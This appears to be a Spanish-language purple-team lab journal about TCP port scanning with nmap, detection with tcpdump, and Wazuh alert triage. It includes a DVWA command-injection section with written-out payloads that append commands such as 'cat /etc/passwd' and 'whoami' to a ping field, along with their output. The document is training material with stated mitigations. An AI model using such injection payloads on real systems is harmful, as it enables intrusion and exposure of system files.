# Día 2 — Port Scanning TCP

**MITRE ATT&CK:** T1046 — Network Service Discovery  
**Táctica:** Discovery (TA0007)

## 🔴 Red Team

### Comandos ejecutados
| Comando | Output |
|---|---|
| `nmap <target>` | 4 puertos abiertos: 22, 80, 3000, 8080 |
| `sudo nmap -sS <target>` | SYN Scan stealth — mismos 4 puertos |
| `nmap -sV <target>` | OpenSSH 10.0p2, Apache, OWASP Juice Shop en 3000, DVWA en 8080 |
| `sudo nmap -sS -sV -O <target>` | OS: Linux 4.15-5.19 |
| `nmap -p 22,80,443,3306,8080 <target>` | 443 closed, 3306 closed — MySQL no expuesto |
| `sudo nmap -sS -p- <target>` | Solo 4 puertos abiertos en los 65535 totales |

### Hallazgos
- Puerto 3000 → **OWASP Juice Shop** — aplicación vulnerable no esperada
- Apache sin HTTPS — puerto 443 cerrado
- MySQL no expuesto externamente — puerto 3306 cerrado
- TTL=127 en HTB Dancing → Windows identificado por OS fingerprinting

## 🔵 Blue Team

### Detección
| Comando | Qué detectó |
|---|---|
| `sudo tcpdump -i enp0s3 -n src host <attacker> and not port 22 -w dia02_capture.pcap` | SYN packets masivos capturados |
| `sudo tcpdump -r dia02_capture.pcap -n` | ~1000 paquetes SYN en menos de 1 segundo |

### Evidencia
- Cientos de `Flags [S]` desde el atacante hacia diferentes puertos
- Todo el scan en 1 segundo — patrón inconfundible de automatización
- Solo puertos abiertos respondieron con `Flags [R]` — RST visible

## 🟣 Purple Team Analysis

**Effectiveness Score: 55/100**

| 🔴 Red Team | 🔵 Blue Team |
|---|---|
| SYN Scan identificó 4 puertos abiertos | tcpdump capturó cientos de SYN packets |
| Version detection reveló versiones exactas | Patrón de velocidad delata automatización |
| OS detection confirmó Linux | Sin alerta automática |

### Security Gaps
- Sin IDS — SYN scan no genera alertas automáticas
- Puerto 3000 expone Juice Shop — aplicación vulnerable accesible
- Apache sin versión oculta — `nmap -sV` reveló versión exacta
- Sin firewall activo

### Lección
Un port scan revela versiones exactas de software — información crítica para el atacante. Ocultar versiones y reducir superficie de ataque son las primeras líneas de defensa.

## 🔓 DVWA — Command Injection (Low)

### Comandos de explotación
| Input | Output |
|---|---|
| `192.168.1.1` | Ping normal ejecutado |
| `192.168.1.1; whoami` | `www-data` — usuario del servidor web |
| `192.168.1.1; cat /etc/passwd` | 1 usuario real (root) + 19 cuentas de servicio expuestas |
| `192.168.1.1; uname -a` | Linux 6.17.0-19-generic Ubuntu x86_64 |
| `192.168.1.1; ls /var/www/html` | Estructura completa del servidor web expuesta |

### Mitigación
- Validar que el input sea exactamente una IP con regex
- Usar `escapeshellarg()` en PHP
- Principio de mínimo privilegio para `www-data`

## 🟡 Wazuh
- 951 alertas (4 Medium + 947 Low)
- Rule 60602: mmc.exe crasheó — investigado, no relacionado con corrupción
- Rule 60776: SessionEnv — RDP deshabilitado como mitigación
- **Mitigación aplicada:** RDP deshabilitado — `fDenyTSConnections: 1` + `TcpTestSucceeded: False` confirmado
